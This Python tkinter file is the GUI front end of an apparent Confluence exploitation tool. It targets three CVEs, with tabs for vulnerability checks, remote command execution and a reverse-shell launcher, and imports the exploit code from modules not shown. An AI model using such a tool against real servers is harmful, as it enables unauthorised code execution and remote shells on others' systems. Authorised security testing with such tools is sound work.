import tkinter as tk
from tkinter import messagebox
from tkinter import scrolledtext
from PIL import Image, ImageTk
import os,json
from datetime import datetime
from tkinter import ttk
from tkinter import Scrollbar
import toolss.utils
import toolss.check_proxy
from tkinter import filedialog
from tkinter import font
from pocs import CVE_2021_26084, CVE_2022_26134, CVE_2023_22527



class Agreementwindow:
    def __init__(self, root) -> None:
        self.root = root
        self.root.title("用户须知")
        self.create_widgets()
        

    def create_widgets(self):
        x = (self.root.winfo_screenwidth() - 600) / 2
        y = (self.root.winfo_screenheight() - 300) / 2
        self.root.geometry(f"500x300+{int(x)}+{int(y)}")

        self.root.resizable(0,0) # 禁止拉伸窗口
        self.root.overrideredirect(1) # 隐藏标题栏 最大化最小化按钮

        self.content_text = tk.Text(self.root, wrap=tk.WORD,width=100, height = 16)
        bold_font = font.Font(family="Helvetica", size=14, weight="bold")
        self.content_text.insert(tk.END, "\n    免责声明:\n\n\n\n   本工具仅用于安全测试为目的，使用者需遵守当地的法律法规。\n\n   使用本工具导致的一切后果由使用者承担。谨慎使用，请勿用于非法用途。\n\n   如果你同意此免责声明，请点击\"同意\"继续使用，否则点击\"拒绝\"退出。")
        self.content_text.pack()
        self.content_text.configure(background="orange")
        self.content_text.tag_configure("bold", font=bold_font)
        self.content_text.tag_add("bold", "2.0", "2.end")
        self.content_text.configure(state=tk.DISABLED)  # 设置为只读

        self.agree_check=tk.IntVar()
        agree_checkbox = tk.Checkbutton(self.root, text="我同意以上免责条款", variable=self.agree_check)
        agree_checkbox.pack(pady=10)

        button_frame = tk.Frame(self.root)
        button_frame.pack()
        
        agree_button = tk.Button(button_frame, text="同 意", command=self.agree_action, bg="green", fg="white")
        agree_button.pack(side=tk.LEFT, padx=100, pady=10,ipadx=5)
        cancel_button = tk.Button(button_frame, text="拒 绝", command=self.root.quit, bg="red", fg="white")
        cancel_button.pack(side=tk.RIGHT, padx=100, pady=10,ipadx=5)
    
    def agree_action(self):
        if self.agree_check.get() == 0: # 检查复选框是否选中
            messagebox.showwarning("请注意!", "请先同意以上免责条款")
        else:
            self.root.destroy()
            gui_main()


class MY_GUI:

    def __init__(self, init_window, width, height) :
        self.init_window = init_window
        self.width = width
        self.height = height
        self.saved_values = {
            "enable_disable_var": tk.StringVar(value="disable"),
            "protocol_value": tk.StringVar(value="请选择协议"),
            "ip_entry_value": tk.StringVar(value="127.0.0.1"),
            "port_entry_value": tk.StringVar(value="8080"),
            "username_entry_value": tk.StringVar(),
            "password_entry_value": tk.StringVar()
        }
           

    def set_window(self):
        self.init_window.title("confluence利用工具   Auth: XSY-BBD")

        screen_width = self.init_window.winfo_screenwidth()
        screen_height = self.init_window.winfo_screenheight()
        x = (screen_width-self.width) / 2
        y = (screen_height-self.height) / 2

        self.init_window.geometry(f"{self.width}x{self.height}+{int(x)}+{int(y)}")

    
        current_path = os.path.abspath(os.path.dirname(os.path.dirname(__file__)))    
        icon_image = ImageTk.PhotoImage(Image.open(current_path + "\\icon\\time.ico"))
        self.init_window.iconphoto(False, icon_image)
        
        # 创建菜单栏
        self.menubar = tk.Menu(self.init_window,font=('Arial', 10))
        # 创建菜单项
        self.filemenu = tk.Menu(self.menubar, tearoff=0, font=('Arial', 10))
        self.menubar.add_cascade(label="File",menu=self.filemenu)
        # 在File中加入New、Open、Save等小菜单
        self.filemenu.add_command(label="打开(O)",accelerator='Ctrl+O',command=self.open_file)
        self.filemenu.add_command(label="保存(S)",accelerator='Ctrl+S')
        self.filemenu.add_separator()    # 添加一条分隔线
        self.filemenu.add_command(label="退出",command=self.init_window.destroy)
        # editmenu
        self.editmenu = tk.Menu(self.menubar, tearoff=0, font=('Arial', 10))
        self.menubar.add_cascade(label="Edit",menu=self.editmenu)
        self.editmenu.add_command(label="Cut(X)",accelerator='Ctrl+X',command=self.cut_text)
        self.editmenu.add_command(label="Copy(C)",accelerator='Ctrl+C',command=self.copy_text)
        self.editmenu.add_command(label="Paste(V)",accelerator='Ctrl+V',command=self.paste_text)
        # proxymenu
        self.proxymenu = tk.Menu(self.menubar, tearoff=0, font=('Arial', 10))
        self.menubar.add_cascade(label="Proxy", menu=self.proxymenu)
        self.proxymenu.add_command(label="Set", command=self.open_window)
        # aboutmenu
        self.aboutmenu = tk.Menu(self.menubar, tearoff=0, font=('Arial', 10))
        self.menubar.add_cascade(label="About", menu=self.aboutmenu)
        self.aboutmenu.add_command(label="About", command=self.show_info)
        self.aboutmenu.add_command(label="Info", command=self.show_use)


        self.init_window.bind('<Control-o>',self.open_file)
        self.init_window.bind('<Control-s>')
        self.init_window.bind('<Control-x>',self.cut_text)
        self.init_window.bind('<Control-c>',self.copy_text)
        self.init_window.bind('<Control-v>',self.paste_text)

        self.init_window.config(menu=self.menubar)

        # 绑定右键菜单
        self.init_window.bind("<Button-3>", self.show_context_menu)
        
        

        # 界面布局 上半部分
        self.top_frame = tk.Frame(self.init_window, highlightthickness=2, highlightbackground="lightgray", highlightcolor="lightgray")
        self.top_frame.pack(side=tk.TOP, fill="x", padx=2,pady=2)

        self.time_label = tk.Label(self.top_frame,text='',fg='green',font=('Arial',10),highlightthickness=2, highlightbackground="lightgray", highlightcolor="lightgray")
        self.time_label.grid(row=0,column=0,padx=3,pady=3)
        self.gettime()
        
        self.top_show_label = tk.Label(self.top_frame, text="Target:",fg='blue', font=('Arial', 10))
        self.top_show_label.grid(row=0,column=1,padx=5,pady=5)
       

        self.target = tk.StringVar() # 将输入的值付给变量
        self.target.set("127.0.0.1") # 显示初始值
        self.target_entry = tk.Entry(self.top_frame,textvariable=self.target,font=('Arial', 10),fg='blue', width=28, highlightbackground="lightgray", highlightcolor="lightgray", show=None) 
        self.target_entry.grid(row=0,column=2,padx=5,pady=5,ipadx=20)

        self.target_button = tk.Button(self.top_frame, text="检   测",fg='blue', font=('Arial', 10), width=5, command=self.get_combox_values_type)# , height=1, borderwidth=0, highlightthickness=0, relief="flat"
        # target_button.pack(side= tk.LEFT,expand=True, padx=10, pady=5)
        self.target_button.grid(row=0,column=3,padx=10,pady=3,ipadx=5)

        self.target_button = tk.Button(self.top_frame, text="清空面板",fg='blue', font=('Arial', 10), width=5, command=lambda: self.button_clicked(2))# , height=1, borderwidth=0, highlightthickness=0, relief="flat"
        # target_button.pack(side= tk.LEFT,expand=True, padx=10, pady=5)
        self.target_button.grid(row=0,column=4,padx=10,pady=3,ipadx=5)

        self.target_combox_number = tk.StringVar() # 是否被选中
        # self.target_combox_number.set("请选择")
        self.target_combox = ttk.Combobox(self.top_frame, width=17,height=5,textvariable=self.target_combox_number, font=('Arial', 10), state='readonly') # state='readonly'
        self.target_combox["values"] = ["请选择","CVE-2021-26084", "CVE-2022-26134", "CVE-2023-22527"]
        self.target_combox.current(0)    
        # self.target_combox.bind("<<ComboboxSelected>>",self.on_combobox_click) # 绑定事件
        self.target_combox.grid(row=0,column=5,padx=5,pady=5)


        # 中部布局
        self.center_frame = tk.Frame(self.init_window, highlightthickness=2, highlightbackground="lightgray", highlightcolor="lightgray")
        self.center_frame.pack(side=tk.TOP, fill="both", expand=True, padx=3, pady=3)

        # 创建Notebook小部件
        self.notebook = ttk.Notebook(self.center_frame)
        self.notebook.pack(fill="both", expand=True)

        # 创建标签页
        self.page1 = tk.Frame(self.notebook)
        self.notebook.add(self.page1, text="检测日志")
        self.page2 = tk.Frame(self.notebook)
        self.notebook.add(self.page2, text="命令执行")
        self.page3 = tk.Frame(self.notebook)
        self.notebook.add(self.page3, text="反弹SHELL")
    


        self.center_text = tk.Text(self.page1, wrap="word", state='disabled', height=30)
        self.center_text.pack(side=tk.LEFT, fill="both", expand=True)
        # 创建垂直滚动条并绑定到Text部件
        v_scroll = Scrollbar(self.page1, orient="vertical",command=self.center_text.yview)
        v_scroll.pack(side=tk.RIGHT, fill="y")
        self.center_text.config(yscrollcommand=v_scroll.set)
        
        self.page2_top_frame = tk.Frame(self.page2, highlightthickness=2, highlightbackground="lightgray", highlightcolor="lightgray")
        self.page2_top_frame.pack(side=tk.TOP, fill="x", padx=2,pady=2)
        self.page2_show_label = tk.Label(self.page2_top_frame, text="输入命令:",fg='blue', font=('Arial', 10))
        self.page2_show_label.grid(row=0,column=1,padx=5,pady=5)
       
        self.command = tk.StringVar() # 将输入的值付给变量
        self.command.set("whoami") # 显示初始值
        self.command_entry = tk.Entry(self.page2_top_frame,textvariable=self.command,font=('Arial', 10),fg='blue', width=55, highlightbackground="lightgray", highlightcolor="lightgray", show=None) 
        self.command_entry.grid(row=0,column=2,padx=5,pady=5,ipadx=20)

        self.command_button = tk.Button(self.page2_top_frame, text="执行命令",fg='blue', font=('Arial', 10), width=5, command=self.exploit_moduls)# , height=1, borderwidth=0, highlightthickness=0, relief="flat"
        # target_button.pack(side= tk.LEFT,expand=True, padx=10, pady=5)
        self.command_button.grid(row=0,column=3,padx=10,pady=3,ipadx=5)
        self.clear_button = tk.Button(self.page2_top_frame, text="清空面板",fg='blue', font=('Arial', 10), width=5, command=lambda: self.button_clicked(1))# , height=1, borderwidth=0, highlightthickness=0, relief="flat"
        # target_button.pack(side= tk.LEFT,expand=True, padx=10, pady=5)
        self.clear_button.grid(row=0,column=4,padx=10,pady=3,ipadx=5)

        self.command_text = tk.Text(self.page2, wrap="word", state='disabled', height=30)
        self.command_text.pack(side=tk.LEFT, fill="both", expand=True)
        # 创建垂直滚动条并绑定到Text部件
        v_scroll = Scrollbar(self.page2, orient="vertical",command=self.command_text.yview)
        v_scroll.pack(side=tk.RIGHT, fill="y")
        self.command_text.config(yscrollcommand=v_scroll.set)

        #标签三
        self.page3_top_frame = tk.Frame(self.page3, highlightthickness=2, highlightbackground="lightgray", highlightcolor="lightgray")
        self.page3_top_frame.pack(side=tk.TOP, fill="x", padx=2,pady=2)
        
        self.page3_show_label = tk.Label(self.page3_top_frame, text="LHOST:",fg='blue', font=('Arial', 10))
        self.page3_show_label.grid(row=0,column=1,padx=5,pady=5)       
        self.lhost = tk.StringVar() # 将输入的值付给变量
        self.lhost.set("127.0.0.1") # 显示初始值
        self.lhost_entry = tk.Entry(self.page3_top_frame,textvariable=self.lhost,font=('Arial', 10),fg='blue', width=30, highlightbackground="lightgray", highlightcolor="lightgray", show=None) 
        self.lhost_entry.grid(row=0,column=2,padx=5,pady=5,ipadx=20)

        self.page3_show_label = tk.Label(self.page3_top_frame, text="LPORT:",fg='blue', font=('Arial', 10))
        self.page3_show_label.grid(row=0,column=3,padx=5,pady=5)       
        self.lport = tk.StringVar() # 将输入的值付给变量
        self.lport.set("8080") # 显示初始值
        self.lport_entry = tk.Entry(self.page3_top_frame,textvariable=self.lport,font=('Arial', 10),fg='blue', width=15, highlightbackground="lightgray", highlightcolor="lightgray", show=None) 
        self.lport_entry.grid(row=0,column=4,padx=5,pady=5,ipadx=20)

        self.reverse_button = tk.Button(self.page3_top_frame, text="反弹SHELL",fg='blue', font=('Arial', 10), width=10, command=self.reverse_moduls)
        self.reverse_button.grid(row=0,column=5,padx=25,pady=3,ipadx=5)

        self.reverse_text = tk.Text(self.page3, wrap="word", state='disabled', height=30)
        self.reverse_text.pack(side=tk.LEFT, fill="both", expand=True)
        # 创建垂直滚动条并绑定到Text部件
        v_scroll = Scrollbar(self.page3, orient="vertical",command=self.reverse_text.yview)
        v_scroll.pack(side=tk.RIGHT, fill="y")
        self.reverse_text.config(yscrollcommand=v_scroll.set)
        

        # 底部布局
        self.bottom_frame = tk.Frame(self.init_window, highlightthickness=2, highlightbackground="lightgray", highlightcolor="lightgray")
        # self.bottom_frame.pack(side=tk.BOTTOM, fill="both", expand=True, padx=3, pady=3)
        self.bottom_frame.pack(side=tk.BOTTOM, fill="both", expand=True, padx=3, pady=3)
        self.logg_text = tk.Text(self.bottom_frame, wrap="word", bg="black", fg="green",height=20, state='disabled')
        self.logg_text.pack(side=tk.LEFT, fill="both", expand=True)
        # 创建垂直滚动条并绑定到Text部件
        v_scroll = Scrollbar(self.bottom_frame, orient="vertical", command=self.logg_text.yview)
        v_scroll.pack(side=tk.RIGHT, fill="y")
        self.logg_text.config(yscrollcommand=v_scroll.set)
        


    
    def show_info(self):
        messagebox.showinfo("information","版本信息：1.0\n作者: XSY-BBD")
    
    def show_use(self):
        messagebox.showinfo("关于","请勿用于非法破坏，一切后果自己承担！")
    
    def cut_text(self):
        self.init_window.focus_get().event_generate('<<Cut>>')
    
    def copy_text(self):
        self.init_window.focus_get().event_generate('<<Copy>>')
    

    def paste_text(self, event=None):
        self.init_window.focus_get().event_generate('<<Paste>>')

    # 右键菜单
    def show_context_menu(self, event):
        context_menu = tk.Menu(self.init_window, tearoff=0)
        context_menu.add_command(label="打开", command=self.open_file)
        context_menu.add_command(label="保存")
        context_menu.add_separator()
        context_menu.add_command(label="复制", command=self.copy_text)
        context_menu.add_command(label="剪切", command=self.cut_text)
        context_menu.add_command(label="粘贴", command=self.paste_text)
        context_menu.add_separator()
        context_menu.add_command(label="退出", command=self.init_window.destroy) # self.init_window.quit, quit只是退出主循环（mainloop）
        context_menu.post(event.x_root, event.y_root)
    
    def gettime(self):
        timestr = datetime.now().strftime('%H:%M:%S') # 获取当前的时间并转化为字符串
        self.time_label.config(text=timestr)
        self.time_label.after(1000, self.gettime)


    def button_clicked(self, button_id):
        if button_id == 1:
            self.command_text.config(state='normal')
            self.command_text.delete("1.0", tk.END)
            self.command_text.config(state='disabled')
        elif button_id == 2:
            self.center_text.config(state='normal')
            self.center_text.delete("1.0", tk.END)
            self.center_text.config(state='disabled') 
        

    
    def write_logtext(self, msg):
        log = toolss.utils.write_log(msg) 
        self.logg_text.config(state='normal')
        self.logg_text.insert('end',log)
        self.logg_text.config(state='disabled')
        self.logg_text.see('end')  # 将滚动条定位到最后一行

    
    def open_file(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            self.write_logtext(file_path)
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                # self.write_logtext(content)
                self.center_text.config(state='normal')
                self.center_text.delete('1.0', 'end')
                self.center_text.insert('end', content)
                self.center_text.config(state='disabled')
    

    def open_window(self):
        # 创建窗口
        self.new_window = tk.Toplevel(self.init_window)
        self.new_window.title("proxy")

        # 设置新窗口大小
        window_width = 300
        window_height = 300
        screen_width = self.new_window.winfo_screenwidth()
        screen_height = self.new_window.winfo_screenheight()
        x = int((screen_width - window_width) / 2)
        y = int((screen_height - window_height) / 2)
        self.new_window.geometry(f"{window_width}x{window_height}+{x}+{y}")

        # 设置网格布局权重
        self.new_window.columnconfigure(0, weight=1)
        self.new_window.columnconfigure(1, weight=1)
        self.new_window.rowconfigure(0, weight=1)
        self.new_window.rowconfigure(1, weight=1)
        self.new_window.rowconfigure(2, weight=1)
        self.new_window.rowconfigure(3, weight=1)
        self.new_window.rowconfigure(4, weight=1)
        self.new_window.rowconfigure(5, weight=1)
        self.new_window.rowconfigure(6, weight=1)

        # 添加部件到新窗口
        # self.enable_disable_var = tk.StringVar(value="disable")
        self.enable_radio = tk.Radiobutton(self.new_window, text="启用", variable=self.saved_values["enable_disable_var"], value="enable")
        self.enable_radio.grid(row=0, column=0, sticky="w", padx=30, pady=10)
        self.disable_radio = tk.Radiobutton(self.new_window, text="禁用", variable=self.saved_values["enable_disable_var"], value="disable")
        self.disable_radio.grid(row=0, column=1, sticky="w", padx=80, pady=10)
        self.protocol_label = tk.Label(self.new_window, text="协   议:")
        self.protocol_label.grid(row=2, column=0, sticky="e", padx=10)
        self.protocol_combobox = ttk.Combobox(self.new_window, values=["http", "socks5"], textvariable=self.saved_values["protocol_value"])
        # self.protocol_combobox.set("请选择协议")
        self.protocol_combobox.grid(row=2, column=1, sticky="w", padx=10)
        # ip_entry_value = tk.StringVar(value="127.0.0.1")
        self.ip_label = tk.Label(self.new_window, text="IP地址:")
        self.ip_label.grid(row=3, column=0, sticky="e", padx=10)
        self.ip_entry = tk.Entry(self.new_window, width=23, textvariable=self.saved_values["ip_entry_value"])
        self.ip_entry.grid(row=3, column=1, sticky="w", padx=10)
        # port_entry_value = tk.StringVar(value="8080")
        self.port_label = tk.Label(self.new_window, text="端   口:")
        self.port_label.grid(row=4, column=0, sticky="e", padx=10)
        self.port_entry = tk.Entry(self.new_window, width=23, textvariable=self.saved_values["port_entry_value"])
        self.port_entry.grid(row=4, column=1, sticky="w", padx=10)
        self.username_label = tk.Label(self.new_window, text="用户名:")
        self.username_label.grid(row=5, column=0, sticky="e", padx=10)
        self.username_entry = tk.Entry(self.new_window, width=23, textvariable=self.saved_values["username_entry_value"])
        self.username_entry.grid(row=5, column=1, sticky="w", padx=10)
        self.password_label = tk.Label(self.new_window, text="密   码:")
        self.password_label.grid(row=6, column=0, sticky="e", padx=10)
        self.password_entry = tk.Entry(self.new_window, show="*", width=23, textvariable=self.saved_values["password_entry_value"])
        self.password_entry.grid(row=6, column=1, sticky="w", padx=10)
        self.cancel_button = tk.Button(self.new_window, text="取 消", command=self.new_window.destroy)
        self.cancel_button.grid(row=7, column=0, padx=30, pady=10, ipadx=20,sticky="e")
        self.save_button = tk.Button(self.new_window, text="保 存", command=self.save_proxy)
        self.save_button.grid(row=7, column=1, padx=80, pady=10, ipadx=20, sticky="w")
        

    def save_proxy(self):
        self.saved_values["enable_disable_var"].set(self.saved_values["enable_disable_var"].get())
        if self.saved_values["protocol_value"].get():
            self.protocol_combobox.set(self.saved_values["protocol_value"].get())
        self.saved_values["ip_entry_value"].set(self.saved_values["ip_entry_value"].get())
        self.saved_values["port_entry_value"].set(self.saved_values["port_entry_value"].get())
        self.saved_values["username_entry_value"].set(self.saved_values["username_entry_value"].get())
        self.saved_values["password_entry_value"].set(self.saved_values["password_entry_value"].get())
        self.new_window.destroy()
        
    def reverse_moduls(self):
        proxy = self.get_proxy()
        target = self.target_entry.get().strip()
        url = toolss.utils.re_stander_url(target)
        selected_value = self.target_combox.get()
        lhost = self.lhost_entry.get()
        lport = self.lport_entry.get()
        if selected_value == "请选择":
            rs = f"请根据检查的结果选择相应的漏洞编号反弹shell !!!"
            self.reverse_text.config(state='normal')
            self.reverse_text.insert('end',"===============================================================================================\r\n")
            self.reverse_text.insert("end", rs+"\n")
            self.reverse_text.insert('end',"===============================================================================================\r\n")
            self.reverse_text.config(state='disabled')
            self.reverse_text.see('end')
        elif selected_value == "CVE-2022-26134":
            exp = CVE_2022_26134.CVE_2022_26134(url, proxy)
            rs = exp.reverse(lhost, lport)
            # rs = f"{selected_value}反弹shell命令已执行，请回主机{lhost}主机查看结果！！！"
            self.reverse_text.config(state='normal')
            self.reverse_text.insert('end',f"=====================================正在检测{selected_value}====================================\r\n")
            self.reverse_text.insert("end", rs+"\n")
            self.reverse_text.insert('end',"===============================================================================================\r\n")
            self.reverse_text.config(state='disabled')
            self.reverse_text.see('end')
        elif selected_value == "CVE-2023-22527":
            exp = CVE_2023_22527.CVE_2023_22527(url, proxy)
            rs = exp.reverse(lhost, lport)           
            self.reverse_text.config(state='normal')
            self.reverse_text.insert('end',f"=====================================正在检测{selected_value}====================================\r\n")
            for r in rs:
                self.reverse_text.insert("end", r+"\n")
            self.reverse_text.insert('end',"===============================================================================================\r\n")
            self.reverse_text.config(state='disabled')
            self.reverse_text.see('end')
            
        else:
            rs = f"{selected_value} 不支持该利用方式！"
            self.reverse_text.config(state='normal')
            self.reverse_text.insert('end',"===============================================================================================\r\n")
            self.reverse_text.insert("end", rs+"\n")
            self.reverse_text.insert('end',"===============================================================================================\r\n")
            self.reverse_text.config(state='disabled')
            self.reverse_text.see('end')  

    def exploit_moduls(self):
        proxy = self.get_proxy()
        target = self.target_entry.get().strip()
        command = self.command_entry.get()
        url = toolss.utils.re_stander_url(target)
        selected_value = self.target_combox.get()
        if selected_value == "请选择":
            rs = f"[*] 请根据检测的结果选择相应的漏洞编号执行命令!!!"
            self.command_text.config(state='normal')
            self.command_text.insert('end',"===============================================================================================\r\n")
            self.command_text.insert("end", rs+"\n")
            self.command_text.insert('end',"===============================================================================================\r\n")
            self.command_text.config(state='disabled')
            self.command_text.see('end')
        elif selected_value == "CVE-2021-26084":
            exp = CVE_2021_26084.CVE_2021_26084(url, proxy)
            rs = exp.exploit(command)
            self.command_text.config(state='normal')
            self.command_text.insert('end',f"=====================================正在检测{selected_value}====================================\r\n")
            self.command_text.insert("end", rs+"\n")
            self.command_text.insert('end',"===============================================================================================\r\n")
            self.command_text.config(state='disabled')
            self.command_text.see('end')
           
        elif selected_value == "CVE-2022-26134":
            exp = CVE_2022_26134.CVE_2022_26134(url, proxy)
            rs = exp.exploit(command)
            self.command_text.config(state='normal')
            self.command_text.insert('end',f"============================================{selected_value}=====================================\r\n")
            self.command_text.insert("end", rs+"\n")
            self.command_text.insert('end',"===============================================================================================\r\n")
            self.command_text.config(state='disabled')
            self.command_text.see('end')

        elif selected_value == "CVE-2023-22527":
            exp = CVE_2023_22527.CVE_2023_22527(url, proxy)
            rs = exp.exploit(command)            
            self.command_text.config(state='normal')
            self.command_text.insert('end',f"============================================{selected_value}=====================================\r\n")
            self.command_text.insert("end", rs+"\n")
            self.command_text.insert('end',"===============================================================================================\r\n")
            self.command_text.config(state='disabled')
            self.command_text.see('end')
           
        else:
            rs = f"{selected_value} 不支持该利用方式！"
            self.command_text.config(state='normal')
            self.command_text.insert('end',"===============================================================================================\r\n")
            self.command_text.insert("end", rs+"\n")
            self.command_text.insert('end',"===============================================================================================\r\n")
            self.command_text.config(state='disabled')
            self.command_text.see('end')    
        
       

    def get_combox_values(self):
        selected_value = self.target_combox.get()
        if selected_value == "请选择":
            target_combox_values = self.target_combox["values"]
            filtered_values = [value for value in target_combox_values if value != "请选择"]
            return filtered_values
        else:
            return selected_value
    
    def get_combox_values_type(self):
        proxy = self.get_proxy()
        prs, e = toolss.check_proxy.check_proxy_uses(proxy)
        if not e:
            self.center_text.config(state='normal')
            self.center_text.config(fg='red')
            self.center_text.insert('end',"===============================================================================================\r\n")
            self.center_text.insert('end',prs + "\r\n")
            self.center_text.insert('end',"===============================================================================================\r\n\r\n")
            self.center_text.config(state='disabled')
            self.center_text.see('end')
            return
        else:

            target = self.target_entry.get().strip()
            url = toolss.utils.re_stander_url(target)

            select_value = self.get_combox_values()
            if isinstance(select_value, str):
                if select_value == "CVE-2021-26084":
                    exp = CVE_2021_26084.CVE_2021_26084(url, proxy)
                    rs = exp.check()                   
                    self.center_text.config(state='normal')
                    # self.center_text.config(fg='red')
                    self.center_text.insert('end',f"=====================================正在检测{select_value}====================================\r\n")
                    self.center_text.insert('end',rs + "\r\n")
                    self.center_text.insert('end',"===============================================================================================\r\n\r\n")
                    self.center_text.config(state='disabled')
                    self.center_text.see('end')                   

                elif select_value == "CVE-2022-26134":
                    exp = CVE_2022_26134.CVE_2022_26134(target, proxy)
                    rs = exp.check()
                    # rss = f"这是{select_value}"
                    self.center_text.config(state='normal')
                    # self.center_text.config(fg='red')
                    self.center_text.insert('end',f"=====================================正在检测{select_value}====================================\r\n")
                    self.center_text.insert("end", rs+"\n")
                    self.center_text.insert('end',"===============================================================================================\r\n\r\n")
                    self.center_text.config(state='disabled')
                    self.center_text.see('end')
                elif select_value == "CVE-2023-22527":
                    exp=CVE_2023_22527.CVE_2023_22527(target, proxy)
                    rs = exp.check()                   
                    self.center_text.config(state='normal')
                    # self.center_text.config(fg='red')
                    self.center_text.insert('end',f"=====================================正在检测{select_value}====================================\r\n")
                    self.center_text.insert("end", rs+"\n")
                    self.center_text.insert('end',"===============================================================================================\r\n\r\n")
                    self.center_text.config(state='disabled')
                    self.center_text.see('end')
                   

            elif isinstance(select_value,list):
                for s in select_value:
                    if s == "CVE-2021-26084":
                        exp = CVE_2021_26084.CVE_2021_26084(target, proxy)
                        rs = exp.check()
                        
                        self.center_text.config(state='normal')
                        # self.center_text.config(fg='red')
                        self.center_text.insert('end',f"=====================================正在检测{s}====================================\r\n")

                        self.center_text.insert('end',rs + "\r\n")
                        self.center_text.insert('end',"===============================================================================================\r\n\r\n")
                        self.center_text.config(state='disabled')
                        self.center_text.see('end')
                        
                    elif s == "CVE-2022-26134":
                        exp = CVE_2022_26134.CVE_2022_26134(target, proxy)
                        rs = exp.check()
                        # rss = f"这是{select_value}"
                        self.center_text.config(state='normal')
                        # self.center_text.config(fg='red')
                        self.center_text.insert('end',f"=====================================正在检测{s}====================================\r\n")
                        self.center_text.insert("end", rs+"\n")
                        self.center_text.insert('end',"===============================================================================================\r\n\r\n")
                        self.center_text.config(state='disabled')
                        self.center_text.see('end')
                    
                    elif s == "CVE-2023-22527":
                        exp=CVE_2023_22527.CVE_2023_22527(target, proxy)
                        rs = exp.check()               
                        self.center_text.config(state='normal')
                        # self.center_text.config(fg='red')
                        self.center_text.insert('end',f"=====================================正在检测{s}====================================\r\n")
                        self.center_text.insert("end", rs+"\n")
                        self.center_text.insert('end',"===============================================================================================\r\n\r\n")
                        self.center_text.config(state='disabled')
                        self.center_text.see('end')
                        
            else:
                pass
        

    def get_proxy(self):
        enable_disable = self.saved_values["enable_disable_var"].get()

        if enable_disable == "enable":
            if self.saved_values["protocol_value"].get() == "http":
                if self.saved_values["username_entry_value"].get() and self.saved_values["password_entry_value"].get():
                    proxy_str = f"{self.saved_values["protocol_value"].get()}://{self.saved_values["username_entry_value"].get()}:{self.saved_values["password_entry_value"].get()}@{self.saved_values["ip_entry_value"].get()}:{self.saved_values["port_entry_value"].get()}"
                else:
                    proxy_str = f"{self.saved_values["protocol_value"].get()}://{self.saved_values["ip_entry_value"].get()}:{self.saved_values["port_entry_value"].get()}"
            elif self.saved_values["protocol_value"].get() == "socks5":
                if self.saved_values["username_entry_value"].get() and self.saved_values["password_entry_value"].get():
                    proxy_str = f"{self.saved_values["protocol_value"].get()}://{self.saved_values["username_entry_value"].get()}:{self.saved_values["password_entry_value"].get()}@{self.saved_values["ip_entry_value"].get()}:{self.saved_values["port_entry_value"].get()}"
                else:
                    proxy_str = f"{self.saved_values["protocol_value"].get()}://{self.saved_values["ip_entry_value"].get()}:{self.saved_values["port_entry_value"].get()}"
            else:
                return None
        elif enable_disable == "disable":
            return None
        

        proxies = {
            "http": proxy_str,
            "https": proxy_str
        }

        return proxies


def gui_main():
    init_window = tk.Tk()   
    gui = MY_GUI(init_window, 700, 650)
    gui.set_window()
    init_window.mainloop()
    
